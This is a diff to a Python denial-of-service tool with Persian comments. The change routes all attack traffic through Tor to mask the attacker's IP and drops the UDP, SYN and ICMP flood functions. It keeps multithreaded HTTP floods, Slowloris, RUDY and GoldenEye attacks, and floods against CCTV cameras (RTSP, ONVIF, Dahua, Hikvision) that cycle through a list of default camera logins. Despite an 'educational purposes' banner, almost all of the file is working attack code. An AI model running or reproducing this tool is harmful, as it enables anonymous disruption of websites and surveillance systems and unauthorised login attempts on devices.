@@ -1,6 +1,3 @@
-
-print("‌")
-
 import socket
 import threading
 import random
@@ -8,22 +5,26 @@ import time
 import ssl
 import base64
 import sys
+import struct
+import socks
 from colorama import Fore, Style, init
 
 init(autoreset=True)
 
+# تنظیمات Tor
+TOR_PROXY_HOST = "127.0.0.1"
+TOR_PROXY_PORT = 9050
+USE_TOR = True  # تغییر به False اگر نمی‌خواهید از Tor استفاده کنید
 
 NUM_THREADS_PER_ATTACK = 50
 PACKET_SIZE = 2048
-TIMEOUT = 3
+TIMEOUT = 5
 PRINT_LOCK = threading.Lock()
 
 REQUEST_COUNTER = 0
 ERROR_COUNTER = 0
 
-
-PROXIES = [    ]  #["ip:port:user:pass"] پروکسی اینجوری بزن 
-
+PROXIES = []  # ["ip:port:user:pass"] پروکسی اینجوری بزن
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
@@ -35,7 +36,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
 ]
-
 
 CCTV_CREDENTIALS = [
     ("admin", "admin"),
@@ -49,7 +49,6 @@ CCTV_CREDENTIALS = [
     ("operator", "operator"),
     ("tech", "tech")
 ]
-
 
 ATTACK_METHODS = {
     "1": {"name": "HTTP GET Flood", "type": "HTTP", "method": "GET", "desc": "Standard GET request flood"},
@@ -70,28 +69,25 @@ ATTACK_METHODS = {
     "16": {"name": "ONVIF Discovery Flood", "type": "CCTV", "method": "ONVIF", "desc": "ONVIF device discovery flood"},
     "17": {"name": "Dahua Camera Flood", "type": "CCTV", "method": "DAHUA", "desc": "Dahua-specific camera requests"},
     "18": {"name": "Hikvision Camera Flood", "type": "CCTV", "method": "HIKVISION", "desc": "Hikvision-specific requests"},
-    "19": {"name": "MJPEG Stream Flood", "type": "CCTV", "method": "MJPEG", "desc": "MJPEG video stream requests"},
-    "20": {"name": "UDP Flood", "type": "LAYER4", "method": "UDP", "desc": "Raw UDP packet flood"},
-    "21": {"name": "TCP SYN Flood", "type": "LAYER4", "method": "SYN", "desc": "TCP SYN packet flood"},
-    "22": {"name": "ICMP Flood", "type": "LAYER4", "method": "ICMP", "desc": "ICMP ping flood"}
+    "19": {"name": "MJPEG Stream Flood", "type": "CCTV", "method": "MJPEG", "desc": "MJPEG video stream requests"}
 }
 
 class ConsoleUtils:
     @staticmethod
     def clear_screen():
-        
         print("\033[H\033[J", end="")
     
     @staticmethod
     def print_banner():
-        
-        print(f"{Fore.RED}                         WELCOM TO  DDOS ATTACK ")    
-        print(f"{Fore.GREEN}                                    ")
+        print(f"{Fore.RED}╔════════════════════════════════════════╗")
+        print(f"{Fore.RED}║           DDOS ATTACK TOOL            ║")
+        print(f"{Fore.RED}║           WITH TOR SUPPORT            ║")
+        print(f"{Fore.RED}╚════════════════════════════════════════╝")
+        print(f"{Fore.GREEN}        For Educational Purposes Only")
         print("\n")
 
     @staticmethod
     def print_status(message, status_type="info"):
-        
         colors = {
             "info": Fore.CYAN,
             "success": Fore.GREEN,
@@ -103,15 +99,15 @@ class ConsoleUtils:
 
     @staticmethod
     def print_table(headers, rows):
-        
+        if not rows:
+            return
+            
         col_widths = [max(len(str(item)) for item in col) for col in zip(headers, *rows)]
-        
         
         header_str = " │ ".join(f"{h:{w}}" for h, w in zip(headers, col_widths))
         print(f"{Fore.CYAN}┌─{'─┬─'.join('─' * w for w in col_widths)}─┐")
         print(f"{Fore.CYAN}│ {header_str} │")
         print(f"{Fore.CYAN}├─{'─┼─'.join('─' * w for w in col_widths)}─┤")
-        
         
         for row in rows:
             row_str = " │ ".join(f"{str(item):{w}}" for item, w in zip(row, col_widths))
@@ -122,7 +118,6 @@ class ConsoleUtils:
 class TargetUtils:
     @staticmethod
     def clean_target(target):
-        
         protocols = ("https://", "http://", "rtsp://", "ws://", "wss://")
         if target.startswith(protocols):
             target = target.split("//")[1]
@@ -132,20 +127,53 @@ class TargetUtils:
 
     @staticmethod
     def resolve_target(target):
-        
         try:
-            return socket.gethostbyname(target)
-        except socket.gaierror:
-            ConsoleUtils.print_status("Error resolving domain! Check your target or network connection.", "error")
-            exit()
+            # استفاده از Tor برای DNS lookup
+            if USE_TOR:
+                sock = socks.socksocket()
+                sock.settimeout(10)
+                sock.connect((target, 80))
+                return sock.getpeername()[0]
+            else:
+                return socket.gethostbyname(target)
         except Exception as e:
-            ConsoleUtils.print_status(f"Critical resolution error: {str(e)}", "critical")
-            exit()
+            ConsoleUtils.print_status(f"Error resolving target: {str(e)}", "error")
+            return None
+
+class TorUtils:
+    @staticmethod
+    def setup_tor_proxy():
+        """تنظیم Tor به عنوان پروکسی پیش‌فرض"""
+        if not USE_TOR:
+            return True
+            
+        try:
+            socks.set_default_proxy(socks.SOCKS5, TOR_PROXY_HOST, TOR_PROXY_PORT)
+            socket.socket = socks.socksocket
+            
+            # تست اتصال Tor
+            test_sock = socks.socksocket()
+            test_sock.settimeout(10)
+            test_sock.connect(("check.torproject.org", 80))
+            test_sock.send(b"GET / HTTP/1.1\r\nHost: check.torproject.org\r\n\r\n")
+            response = test_sock.recv(1024).decode()
+            test_sock.close()
+            
+            if "Congratulations" in response:
+                ConsoleUtils.print_status("Tor connection successful! IP masked.", "success")
+                return True
+            else:
+                ConsoleUtils.print_status("Tor is not working properly", "warning")
+                return False
+                
+        except Exception as e:
+            ConsoleUtils.print_status(f"Tor setup failed: {str(e)}", "error")
+            ConsoleUtils.print_status("Make sure Tor is running on 127.0.0.1:9050", "warning")
+            return False
 
 class AttackUtils:
     @staticmethod
     def generate_dynamic_path():
-        
         paths = [
             f"/{random.randint(1000,9999)}",
             f"/img/{random.randint(1,1000)}.jpg",
@@ -160,7 +188,6 @@ class AttackUtils:
 
     @staticmethod
     def generate_random_params():
-        
         params = [
             f"?id={random.randint(1,100000)}",
             f"?search={random_string(10)}",
@@ -174,7 +201,6 @@ class AttackUtils:
 
     @staticmethod
     def generate_http_flood_headers(method, is_cctv=False):
-        
         headers = {
             'User-Agent': random.choice(USER_AGENTS),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -194,7 +220,7 @@ class AttackUtils:
             })
         
         if method == "OPTIONS":
-            for i in range(1, 50):
+            for i in range(1, 20):
                 headers[f'X-Custom-Header-{i}'] = random_string(10)
         
         if method in ["POST", "PUT", "PATCH"]:
@@ -205,26 +231,15 @@ class AttackUtils:
                 'text/xml'
             ])
         
-        if method == "PATCH":
-            headers['Cookie'] = f'session_id={random_string(1000)}'
-        
-        if method == "TRACE":
-            headers['Referer'] = random.choice([
-                "https://google.com",
-                "https://facebook.com",
-                "https://twitter.com"
-            ])
-        
         return headers
 
     @staticmethod
     def create_ssl_connection(target_ip, target_port):
-        
         context = ssl.create_default_context()
         context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
         
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = socks.socksocket() if USE_TOR else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(TIMEOUT)
         ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
         ssl_sock.connect((target_ip, target_port))
@@ -232,7 +247,6 @@ class AttackUtils:
 
     @staticmethod
     def create_rtsp_request(target_ip, port, method):
-        
         username, password = random.choice(CCTV_CREDENTIALS)
         auth_header = f"Authorization: Basic {base64.b64encode(f'{username}:{password}'.encode()).decode()}\r\n"
         
@@ -240,14 +254,12 @@ class AttackUtils:
             f"OPTIONS rtsp://{target_ip}:{port}/ RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\n{auth_header}\r\n",
             f"DESCRIBE rtsp://{target_ip}:{port}/live.sdp RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nAccept: application/sdp\r\n{auth_header}\r\n",
             f"SETUP rtsp://{target_ip}:{port}/trackID=1 RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nTransport: RTP/AVP;unicast;client_port={random.randint(2000,60000)}-{random.randint(2000,60000)}\r\n{auth_header}\r\n",
-            f"PLAY rtsp://{target_ip}:{port}/ RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nSession: {random.randint(100000,999999)}\r\n{auth_header}\r\n",
-            f"TEARDOWN rtsp://{target_ip}:{port}/ RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nSession: {random.randint(100000,999999)}\r\n{auth_header}\r\n"
+            f"PLAY rtsp://{target_ip}:{port}/ RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nSession: {random.randint(100000,999999)}\r\n{auth_header}\r\n"
         ]
         return random.choice(requests)
 
     @staticmethod
     def create_onvif_request(target_ip, port):
-        
         return (
             '<?xml version="1.0" encoding="UTF-8"?>'
             '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
@@ -259,7 +271,6 @@ class AttackUtils:
 
     @staticmethod
     def create_dahua_request(target_ip, port):
-        
         return (
             f"GET /cgi-bin/magicBox.cgi?action=getSystemInfo HTTP/1.1\r\n"
             f"Host: {target_ip}:{port}\r\n"
@@ -270,7 +281,6 @@ class AttackUtils:
 
     @staticmethod
     def create_hikvision_request(target_ip, port):
-        
         return (
             f"GET /ISAPI/System/deviceInfo HTTP/1.1\r\n"
             f"Host: {target_ip}:{port}\r\n"
@@ -281,7 +291,6 @@ class AttackUtils:
 
     @staticmethod
     def create_mjpeg_request(target_ip, port):
-        
         return (
             f"GET /video/mjpg.cgi HTTP/1.1\r\n"
             f"Host: {target_ip}:{port}\r\n"
@@ -291,46 +300,24 @@ class AttackUtils:
             f"\r\n"
         )
 
-    @staticmethod
-    def create_udp_packet():
-        
-        return bytes(random.getrandbits(8) for _ in range(PACKET_SIZE))
-
-    @staticmethod
-    def create_syn_packet(target_ip, target_port):
-        
-        packet = (
-            b'\x00\x00' +  
-            struct.pack('!H', target_port) +  
-            struct.pack('!I', random.randint(0, 2**32 - 1)) +  
-            b'\x00\x00\x00\x00' +  
-            b'\x50\x02\x00\x00' +  
-            b'\x00\x00' +  
-            b'\x00\x00' +  
-            b'\x00\x00'    
-        )
-        return packet
-
 def random_string(length):
-    
     chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
     return ''.join(random.choice(chars) for _ in range(length))
 
 class AttackLogger:
     @staticmethod
     def log_success(proxy, method, target_ip, status_code=None):
-        
         global REQUEST_COUNTER
         REQUEST_COUNTER += 1
         status_part = f"{Fore.CYAN} {status_code}" if status_code else ""
         proxy_info = f"{Fore.MAGENTA} via {proxy}" if proxy else ""
+        tor_info = f"{Fore.BLUE} [TOR]" if USE_TOR else ""
         
         with PRINT_LOCK:
-            print(f"{Fore.GREEN}[✓] {Fore.YELLOW}{method}{status_part} => {Fore.CYAN}{target_ip}{proxy_info} | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")
+            print(f"{Fore.GREEN}[✓] {Fore.YELLOW}{method}{status_part} => {Fore.CYAN}{target_ip}{proxy_info}{tor_info} | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")
 
     @staticmethod
     def log_error(error_type, proxy=None, target_ip=None, status_code=None):
-        
         global ERROR_COUNTER
         ERROR_COUNTER += 1
         
@@ -359,11 +346,10 @@ class AttackLogger:
                 print(error_messages['generic'] + f" | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")
 
 def send_cctv_flood(target_ip, target_port, method):
-    
     while True:
         sock = None
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock = socks.socksocket() if USE_TOR else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(TIMEOUT)
             sock.connect((target_ip, target_port))
             
@@ -416,7 +402,6 @@ def send_cctv_flood(target_ip, target_port, method):
                     pass
 
 def send_http_flood(target_ip, target_port, method, use_proxy=False):
-    
     while True:
         sock = None
         proxy = random.choice(PROXIES) if use_proxy and PROXIES else None
@@ -425,7 +410,7 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
             if method == "HTTPS":
                 sock = AttackUtils.create_ssl_connection(target_ip, target_port)
             else:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock = socks.socksocket() if USE_TOR else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(TIMEOUT)
             
             if proxy:
@@ -453,14 +438,12 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
                 sock.connect((proxy_ip, proxy_port))
                 sock.send(connect_request.encode())
                 
-                
                 response = sock.recv(4096)
                 if b"200" not in response:
                     raise Exception("Proxy connection failed")
             
             else:
                 sock.connect((target_ip, target_port))
-            
             
             http_method = method
             if method == "ALL":
@@ -472,11 +455,9 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
             elif method in ["PUT", "GOLDENEYE"]:
                 path = AttackUtils.generate_random_params()
             
-            # Build request
             headers = AttackUtils.generate_http_flood_headers(method)
             
             if method == "SLOWLORIS":
-                
                 request = f"{http_method} {path} HTTP/1.1\r\nHost: {target_ip}\r\n"
                 sock.send(request.encode())
                 for key, value in headers.items():
@@ -486,7 +467,6 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
                 time.sleep(60)
                 continue
             elif method == "RUDY":
-                
                 headers['Content-Length'] = "1000000"
                 request = (
                     f"{http_method} {path} HTTP/1.1\r\n"
@@ -501,7 +481,6 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
                     sock.send(random_string(10).encode())
                     time.sleep(10)
             elif method == "GOLDENEYE":
-                
                 request = (
                     f"{http_method} {path} HTTP/1.1\r\n"
                     f"Host: {target_ip}\r\n"
@@ -515,7 +494,6 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
                     sock.send(f"X-a: {random.randint(1,1000)}\r\n".encode())
                     time.sleep(random.uniform(5, 10))
             elif method == "WEBSOCKET":
-                
                 request = (
                     f"GET {path} HTTP/1.1\r\n"
                     f"Host: {target_ip}\r\n"
@@ -532,9 +510,8 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
                 while True:
                     time.sleep(1)
             else:
-                
                 request = (
-                    f"{http_method} {path} HTTP/{random.choice(['1.0','1.1','2.0'])}\r\n"
+                    f"{http_method} {path} HTTP/{random.choice(['1.0','1.1'])}\r\n"
                     f"Host: {target_ip}\r\n"
                 )
                 
@@ -549,12 +526,15 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
                 
                 sock.send(request.encode())
             
-            
             if method not in ["SLOWLORIS", "RUDY", "GOLDENEYE", "WEBSOCKET"]:
                 try:
                     response = sock.recv(4096).decode('utf-8', errors='ignore')
                     if response:
-                        status_code = response.split(" ")[1]
+                        if "HTTP/" in response:
+                            status_code = response.split(" ")[1]
+                        else:
+                            status_code = "200"
+                        
                         if status_code in ["502", "503", "504", "404"]:
                             AttackLogger.log_error('generic', target_ip=target_ip, status_code=status_code)
                         else:
@@ -563,7 +543,6 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
                         AttackLogger.log_success(proxy, http_method, target_ip, "No Response")
                 except Exception as e:
                     AttackLogger.log_success(proxy, http_method, target_ip, "No Response")
-            
             
             if method not in ["SLOWLORIS", "RUDY", "GOLDENEYE", "WEBSOCKET"]:
                 time.sleep(0.1)
@@ -585,40 +564,7 @@ def send_http_flood(target_ip, target_port, method, use_proxy=False):
                 except:
                     pass
 
-def send_layer4_flood(target_ip, target_port, method):
-    
-    while True:
-        try:
-            if method == "UDP":
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(AttackUtils.create_udp_packet(), (target_ip, target_port))
-                AttackLogger.log_success(None, "UDP", target_ip)
-            elif method == "SYN":
-                
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                sock.sendto(AttackUtils.create_syn_packet(target_ip, target_port), (target_ip, target_port))
-                AttackLogger.log_success(None, "SYN", target_ip)
-            elif method == "ICMP":
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                sock.sendto(AttackUtils.create_udp_packet(), (target_ip, 0))
-                AttackLogger.log_success(None, "ICMP", target_ip)
-            
-            time.sleep(0.01)
-            
-        except PermissionError:
-            ConsoleUtils.print_status("Layer 4 attacks require root/admin privileges!", "error")
-            exit()
-        except Exception as e:
-            AttackLogger.log_error(str(e))
-        finally:
-            if 'sock' in locals():
-                try:
-                    sock.close()
-                except:
-                    pass
-
 def show_attack_methods():
-    
     ConsoleUtils.print_status("Available Attack Methods:", "info")
     
     headers = ["ID", "Name", "Type", "Description"]
@@ -635,7 +581,6 @@ def show_attack_methods():
     ConsoleUtils.print_table(headers, rows)
 
 def select_attack_method():
-    
     while True:
         try:
             choice = input(f"\n{Fore.YELLOW}Enter attack method ID: ").strip()
@@ -647,7 +592,6 @@ def select_attack_method():
             exit()
 
 def get_target_info():
-    
     try:
         target = input(f"{Fore.YELLOW}Enter target IP/Domain: ").strip()
         port = int(input(f"{Fore.YELLOW}Enter target port: ").strip())
@@ -660,11 +604,17 @@ def get_target_info():
         exit()
 
 def start_attack(target_ip, port, selected_method):
-    
+    if target_ip is None:
+        ConsoleUtils.print_status("Could not resolve target!", "error")
+        return
+        
     ConsoleUtils.print_status(
         f"Starting {selected_method['name']} attack on {target_ip}:{port}", 
         "success"
     )
+    
+    if USE_TOR:
+        ConsoleUtils.print_status("All traffic is routed through Tor network", "info")
     
     threads = NUM_THREADS_PER_ATTACK * 2 if selected_method['method'] == "ALL" else NUM_THREADS_PER_ATTACK
     
@@ -674,12 +624,6 @@ def start_attack(target_ip, port, selected_method):
         if selected_method['type'] == "CCTV":
             thread = threading.Thread(
                 target=send_cctv_flood,
-                args=(target_ip, port, selected_method['method']),
-                daemon=True
-            )
-        elif selected_method['type'] == "LAYER4":
-            thread = threading.Thread(
-                target=send_layer4_flood,
                 args=(target_ip, port, selected_method['method']),
                 daemon=True
             )
@@ -699,30 +643,30 @@ def start_attack(target_ip, port, selected_method):
         exit()
 
 def main():
-    
     ConsoleUtils.clear_screen()
     ConsoleUtils.print_banner()
     
-    # ساخته شده توسط تیم انانیموس 
+    # تنظیم Tor
+    if USE_TOR:
+        if not TorUtils.setup_tor_proxy():
+            ConsoleUtils.print_status("Continuing without Tor...", "warning")
+    
+    # دریافت اطلاعات هدف
     target, port = get_target_info()
     target_ip = TargetUtils.resolve_target(TargetUtils.clean_target(target))
     
-    
+    # نمایش متدهای حمله
     show_attack_methods()
     selected_method = select_attack_method()
     
-    
+    # شروع حمله
     start_attack(target_ip, port, selected_method)
 
 if __name__ == "__main__":
     try:
-        import struct  
         main()
     except KeyboardInterrupt:
         ConsoleUtils.print_status("Tool terminated by user.", "warning")
         exit()
     except Exception as e:
         ConsoleUtils.print_status(f"Critical error: {str(e)}", "critical")
-     
-     
-#ANONYMOUS 
